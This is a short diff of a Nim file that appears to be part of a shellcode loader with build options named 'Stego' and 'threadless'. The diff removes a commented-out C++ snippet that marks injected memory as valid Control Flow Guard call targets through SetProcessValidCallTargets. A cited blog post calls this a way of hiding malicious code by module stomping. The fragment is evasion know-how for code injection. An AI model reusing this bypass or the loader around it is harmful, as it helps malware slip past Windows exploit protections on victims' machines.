@@ -2199,23 +2199,8 @@ when defined(Stego):
         return shellcode
 
 
-#[ alternative to disable CFG https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/
-if (srcSect.Characteristics & IMAGE_SCN_MEM_EXECUTE)
-{
-for (unsigned int n = 0; n < srcSect.VirtualSize; n += 16)
-targetModule.markCFGValid(n);
-}
-void markCFGValid(unsigned long long ptrToMarkValid)
-{
-CFG_CALL_TARGET_INFO info;
-info.Flags = CFG_CALL_TARGET_VALID;
-info.Offset = ptrToMarkValid;
+# alternative to disable CFG https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/
 
-if (!SetProcessValidCallTargets_(targetProcess, targetModuleBase, sizeOfImage, 1, &info))
-throw std::exception("SetProcessValidCallTargets failed");
-}
-
-]#
 var cfgspawn: bool = false
 
 when defined(threadless):
